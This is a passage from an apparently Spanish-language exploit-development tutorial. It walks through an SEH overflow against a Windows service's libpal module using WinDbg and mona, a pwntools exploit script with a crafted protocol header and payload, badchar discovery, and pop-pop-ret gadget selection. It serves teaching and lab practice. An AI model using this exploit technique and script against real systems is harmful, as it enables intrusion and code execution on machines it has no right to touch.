01bff3fc: ntdll!ExecuteHandler2+44 (77af8ac0)  
01bffe0c: libpal!md5_starts+149fb (0096d6eb)
01bfff44: 43434343
Invalid exception stack at 42424242

</span><span class="ro">0:000> </span><span class="p">dds esp L4
01bff3e8  77af8aa2 ntdll!ExecuteHandler2+0x26
01bff3ec  01bff4e8 
01bff3f0  01bfff44                 </span><span class="c1">(esp + 8) [ptr to nseh]</span><span class="p">
01bff3f4  01bff538</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos inspeccionar lo que hay en el puntero de <code class="language-plaintext highlighter-rouge">esp + 8</code> podemos ver el valor del siguiente SEH (<code class="language-plaintext highlighter-rouge">0x42424242</code>) seguido del controlador y las <code class="language-plaintext highlighter-rouge">D's</code> de relleno</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dds poi(esp + 8) L4
01bfff44  42424242                 </span><span class="c1">(nseh)</span><span class="p">  
01bfff48  43434343                 </span><span class="c1">(seh)</span><span class="p">  
01bfff4c  44444444                 </span><span class="c1">(DDDD)</span><span class="p">  
01bfff50  44444444                 </span><span class="c1">(DDDD)</span>  
</code></pre></div></div><br>

</section>

<section class="post" id="badchars">
<br><h3 class="post-title">Find Badchars</h3><br>

<p class="plain-text">Algo importante es detectar <code class="language-plaintext highlighter-rouge">bytes</code> que puedan dar problemas, ya que es posible que el programa tenga problemas con algunos caracteres especificos y cortar la cadena, si esto pasa en un shellcode eliminara muchas de las instrucciones y no se ejecutará</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!py mona bytearray
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py bytearray
Generating table, excluding 0 bad chars...
Dumping table to file
[+] Preparing output file 'bytearray.txt'
    - (Re)setting logfile C:\mona\bytearray.txt
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"  
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"  
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"  
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"  
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"  
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"  
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"  
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"  

Done, wrote 256 bytes to file C:\mona\bytearray.txt
Binary output saved in C:\mona\bytearray.bin</span>
</code></pre></div></div><br>

<p class="plain-text">Modificamos el exploit para que en lugar de guardar <code class="language-plaintext highlighter-rouge">D's</code> guarde nuestro bytearray de los <code class="language-plaintext highlighter-rouge">256</code> posibles caracteres para despues comparar la direccion de memoria donde se encuentra con el <code class="language-plaintext highlighter-rouge">.bin</code> que nos creo mona de todos los posibles <code class="language-plaintext highlighter-rouge">badchars</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32

offset </span><span class="o">= </span><span class="mi">124</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

nseh </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
seh </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">4</span><span class="p">

badchars  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"  </span><span class="p">

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">nseh </span><span class="o">+ </span><span class="p">seh
payload </span><span class="o">+= </span><span class="p">badchars
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D" </span><span class="o">* </span><span class="p">(</span><span class="mi">1000 </span><span class="o">- </span><span class="no">len</span><span class="p">(payload))

header  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0xabba1975</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x3</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x1</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(payload[</span><span class="o">-</span><span class="mi">1</span><span class="p">])

content </span><span class="o">= </span><span class="p">header </span><span class="o">+ </span><span class="p">payload

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">9121</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">El programa corrompe y saltamos a la excepción que nos lleva al controlador</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> g
(1370.17b8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=01c0ff44 ebx=00000000 ecx=41414141 edx=00590000 esi=01c0ff08 edi=01c0ff08
eip=008e166a esp=01c0fe00 ebp=01c0ff80 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
libpal!SCA_ConfigObj::Clear+0xa:
008e166a 8b410c          mov     eax,dword ptr [ecx+0Ch] ds:002b:4141414d=????????  

</span><span class="ro">0:000> </span><span class="p">g
(1370.17b8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=43434343 edx=77af8ac0 esi=00000000 edi=00000000
eip=43434343 esp=01c0f850 ebp=01c0f870 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
43434343 ??              ???</span>
</code></pre></div></div><br>

<p class="plain-text">Sabemos que el puntero de <code class="language-plaintext highlighter-rouge">esp + 8</code> apunta a el siguiente SEH por lo que si saltamos los <code class="language-plaintext highlighter-rouge">8</code> bytes del siguiente SEH y controlador la dirección resultante deberia apuntar a lo que enviamos después que son los <code class="language-plaintext highlighter-rouge">badchars</code>, podemos calcular la dirección</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">? poi(esp + 8) + 8
Evaluate expression: 29425484 = 01c0ff4c  </span>
</code></pre></div></div><br>

<p class="plain-text">Comparamos los bytes de esa dirección y parece que ningun byte coincide por lo que probablemente el <code class="language-plaintext highlighter-rouge">0x00</code> esta corrompiendo todo lo que esta después, incluyendose</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!py mona compare -f C:\mona\bytearray.bin -a 01c0ff4c
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py compare -f C:\mona\bytearray.bin -a 01c0ff4c  
[+] Reading file C:\mona\bytearray.bin...
    Read 256 bytes from file
[+] Preparing output file 'compare.txt'
    - (Re)setting logfile C:\mona\compare.txt
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
[+] C:\mona\bytearray.bin has been recognized as RAW bytes.
[+] Fetched 256 bytes successfully from C:\mona\bytearray.bin
    - Comparing 1 location(s)
Comparing bytes from file with memory :
0x01c0ff4c | [+] Comparing with memory at location : 0x01c0ff4c (Stack)
0x01c0ff4c | Only 0 original bytes of 'normal' code found.
0x01c0ff4c |     ,-----------------------------------------------.
0x01c0ff4c |     | Comparison results:                           |
0x01c0ff4c |     |-----------------------------------------------|
0x01c0ff4c |   0 |00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f| File
0x01c0ff4c |     |ff ff ff ff 4c 07 91 00 00 3d 91 00 88 35 05 01| Memory
0x01c0ff4c |  10 |10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f| File
0x01c0ff4c |     |62 3f 91 00 10 ef ae 00 88 35 05 01 14 3d 91 00| Memory
0x01c0ff4c |  20 |20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f| File
0x01c0ff4c |     |10 ef ae 00 00 3d 91 00 c9 fc 93 77 88 35 05 01| Memory
0x01c0ff4c |  30 |30 31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f| File
0x01c0ff4c |     |b0 fc 93 77 dc ff c0 01 5e 7c ad 77 88 35 05 01| Memory
0x01c0ff4c |  40 |40 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f| File
0x01c0ff4c |     |d4 4e 06 d1 00 00 00 00 00 00 00 00 88 35 05 01| Memory
0x01c0ff4c |  50 |50 51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f| File
0x01c0ff4c |     |00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| Memory
0x01c0ff4c |  60 |60 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f| File
0x01c0ff4c |     |00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| Memory
0x01c0ff4c |  70 |70 71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f| File
0x01c0ff4c |     |00 00 00 00 00 00 00 00 8c ff c0 01 00 00 00 00| Memory
0x01c0ff4c |  80 |80 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f| File
0x01c0ff4c |     |e4 ff c0 01 20 af ae 77 48 78 71 a7 00 00 00 00| Memory
0x01c0ff4c |  90 |90 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f| File
0x01c0ff4c |     |ec ff c0 01 2e 7c ad 77 ff ff ff ff f7 8b af 77| Memory
0x01c0ff4c |  a0 |a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af| File
0x01c0ff4c |     |00 00 00 00 00 00 00 00 00 3d 91 00 88 35 05 01| Memory
0x01c0ff4c |  b0 |b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf| File
0x01c0ff4c |     |00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| Memory
0x01c0ff4c |  c0 |c0 c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf| File
0x01c0ff4c |     |00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| Memory
0x01c0ff4c |  d0 |d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df| File
0x01c0ff4c |     |00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| Memory
0x01c0ff4c |  e0 |e0 e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef| File
0x01c0ff4c |     |00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| Memory
0x01c0ff4c |  f0 |f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff| File
0x01c0ff4c |     |00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| Memory
0x01c0ff4c |     `-----------------------------------------------'
0x01c0ff4c | 
0x01c0ff4c |             | File      | Memory    | Note     
0x01c0ff4c | -----------------------------------------------
0x01c0ff4c | 0 0 256 256 | 00 ... ff | ff ... 00 | corrupted
0x01c0ff4c | 
0x01c0ff4c | Possibly bad chars: 00
0x01c0ff4c |</span>
</code></pre></div></div><br>

<p class="plain-text">Lo que hacemos es crear un nuevo bytearray que omita el byte <code class="language-plaintext highlighter-rouge">0x00</code>, esto creará un <code class="language-plaintext highlighter-rouge">.bin</code> que elimina al inicio el null byte, además eliminamos ese <code class="language-plaintext highlighter-rouge">byte</code> del exploit</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> !py mona bytearray -cpb '\x00'
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py bytearray -cpb '\x00'
Generating table, excluding 1 bad chars...
Dumping table to file
[+] Preparing output file 'bytearray.txt'
    - (Re)setting logfile C:\mona\bytearray.txt
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"  
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"  
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"  
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"  
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"  
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"  
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"  
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"  

Done, wrote 255 bytes to file C:\mona\bytearray.txt
Binary output saved in C:\mona\bytearray.bin</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">badchars  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"  </span>
</code></pre></div></div><br>

<p class="plain-text">Enviamos el exploit y al comparar la dirección con el <code class="language-plaintext highlighter-rouge">.bin</code> omite <code class="language-plaintext highlighter-rouge">0x00</code> y el byte <code class="language-plaintext highlighter-rouge">0x01</code> no cambia sin embargo parece que <code class="language-plaintext highlighter-rouge">0x02</code> no se llega a escribir correctamente en el stack por lo que el propio mona nos lo sugiere como un posible <code class="language-plaintext highlighter-rouge">badchar</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">? poi(esp + 8) + 8
Evaluate expression: 29622092 = 01c3ff4c

</span><span class="ro">0:000> </span><span class="p">!py mona compare -f C:\mona\bytearray.bin -a 01c3ff4c
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py compare -f C:\mona\bytearray.bin -a 01c3ff4c  
[+] Reading file C:\mona\bytearray.bin...
    Read 255 bytes from file
[+] Preparing output file 'compare.txt'
    - (Re)setting logfile C:\mona\compare.txt
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
[+] C:\mona\bytearray.bin has been recognized as RAW bytes.
[+] Fetched 255 bytes successfully from C:\mona\bytearray.bin
    - Comparing 1 location(s)
Comparing bytes from file with memory :
0x01c3ff4c | [+] Comparing with memory at location : 0x01c3ff4c (Stack)
0x01c3ff4c | Only 1 original bytes of 'normal' code found.
0x01c3ff4c |     ,-----------------------------------------------.
0x01c3ff4c |     | Comparison results:                           |
0x01c3ff4c |     |-----------------------------------------------|
0x01c3ff4c |   0 |01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10| File
0x01c3ff4c |     |   00 00 00 4c 07 94 00 00 3d 94 00 b8 37 0c 01| Memory
0x01c3ff4c |  10 |11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20| File
0x01c3ff4c |     |62 3f 94 00 10 ef b5 00 b8 37 0c 01 14 3d 94 00| Memory
0x01c3ff4c |  20 |21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30| File
0x01c3ff4c |     |10 ef b5 00 00 3d 94 00 c9 fc 93 77 b8 37 0c 01| Memory
0x01c3ff4c |  30 |31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40| File
0x01c3ff4c |     |b0 fc 93 77 dc ff c3 01 5e 7c ad 77 b8 37 0c 01| Memory
0x01c3ff4c |  40 |41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50| File
0x01c3ff4c |     |e9 cd af 13 00 00 00 00 00 00 00 00 b8 37 0c 01| Memory
0x01c3ff4c |  50 |51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60| File
0x01c3ff4c |     |00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| Memory
0x01c3ff4c |  60 |61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70| File
0x01c3ff4c |     |00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| Memory
0x01c3ff4c |  70 |71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80| File
0x01c3ff4c |     |00 00 00 00 00 00 00 00 8c ff c3 01 00 00 00 00| Memory
0x01c3ff4c |  80 |81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90| File
0x01c3ff4c |     |e4 ff c3 01 20 af ae 77 75 fb db 65 00 00 00 00| Memory
0x01c3ff4c |  90 |91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0| File
0x01c3ff4c |     |ec ff c3 01 2e 7c ad 77 ff ff ff ff 26 8c af 77| Memory
0x01c3ff4c |  a0 |a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0| File
0x01c3ff4c |     |00 00 00 00 00 00 00 00 00 3d 94 00 b8 37 0c 01| Memory
0x01c3ff4c |  b0 |b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf c0| File
0x01c3ff4c |     |00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| Memory
0x01c3ff4c |  c0 |c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0| File
0x01c3ff4c |     |00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| Memory
0x01c3ff4c |  d0 |d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df e0| File
0x01c3ff4c |     |00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| Memory
0x01c3ff4c |  e0 |e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0| File
0x01c3ff4c |     |00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| Memory
0x01c3ff4c |  f0 |f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff   | File
0x01c3ff4c |     |00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   | Memory
0x01c3ff4c |     `-----------------------------------------------'
0x01c3ff4c | 
0x01c3ff4c |             | File      | Memory    | Note       
0x01c3ff4c | -------------------------------------------------
0x01c3ff4c | 0 0 1   1   | 01        | 01        | unmodified!
0x01c3ff4c | 1 1 254 254 | 02 ... ff | 00 ... 00 | corrupted  
0x01c3ff4c | 
0x01c3ff4c | Possibly bad chars: 02
0x01c3ff4c | Bytes omitted from input: 00
0x01c3ff4c |</span>
</code></pre></div></div><br>

<p class="plain-text">Este proceso se tienen que repetir muchas veces hasta obtener todos los <code class="language-plaintext highlighter-rouge">badchars</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!py mona bytearray -cpb '\x00\x02'  </span>
</code></pre></div></div><br>

<p class="plain-text">Cuando esto pase mona nos indicara que todos los bytes comparados con el <code class="language-plaintext highlighter-rouge">.bin</code> no se han modificado, en este caso esto pasa despues de detectar <code class="language-plaintext highlighter-rouge">6</code> badchars</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!py mona compare -f C:\mona\bytearray.bin -a 01c2ff4c
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py compare -f C:\mona\bytearray.bin -a 01c2ff4c  
[+] Reading file C:\mona\bytearray.bin...
    Read 249 bytes from file
[+] Preparing output file 'compare.txt'
    - (Re)setting logfile C:\mona\compare.txt
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
    - Comparing 1 location(s)
Comparing bytes from file with memory :
0x01c2ff4c | [+] Comparing with memory at location : 0x01c2ff4c
0x01c2ff4c | !!! Hooray, normal shellcode unmodified !!!
0x01c2ff4c | Bytes omitted from input: 00 02 0a 0d f8 fd</span>
</code></pre></div></div><br>

</section>

<section class="post" id="opcode">
<br><h3 class="post-title">Find Opcode</h3><br>

<p class="plain-text">Repasemos lo que tenemos, cuando ocurre una excepción en <code class="language-plaintext highlighter-rouge">esp + 8</code> se guarda el puntero al siguiente SEH por lo que si lo usamos como dirección de retorno se ejecutara el <code class="language-plaintext highlighter-rouge">0x42424242</code> como instruccion asm que seria 4 veces <code class="language-plaintext highlighter-rouge">inc edx</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!exchain
01bff3fc: ntdll!ExecuteHandler2+44 (77af8ac0)
01bffe0c: libpal!md5_starts+149fb (0096d6eb)
01bfff44: 43434343
Invalid exception stack at 42424242

</span><span class="ro">0:000> </span><span class="p">dds esp L8
01bff3e8  77af8aa2 ntdll!ExecuteHandler2+0x26
01bff3ec  01bff4e8
01bff3f0  01bfff44
01bff3f4  01bff538
01bff3f8  01bff474
01bff3fc  01bffe0c
01bff400  77af8ac0 ntdll!ExecuteHandler2+0x44
01bff404  01bfff44</span>
</code></pre></div></div><br>

<p class="plain-text">Entonces necesitamos quitar 8 bytes o 2 dwords del stack y ejecutar un ret para ejecutar el siguiente SEH como instruccion asm, esto podemos hacerlo con:</p>
<p class="plain-text">• <code class="language-plaintext highlighter-rouge">pop ???; pop ???; ret;</code>: Eliminara 4 bytes en el primer pop para guardarlo en el registro, 4 bytes en el segundo y al ejecutar el ret ejecutara el siguiente SEH.</p>
<p class="plain-text">• <code class="language-plaintext highlighter-rouge">add esp, 8; ret;</code>: Parecido al anterior solo que en lugar de guardar 2 dwords en registros hace que el puntero al stack aumente en 8 bytes para ejecutar el ret.</p><br>

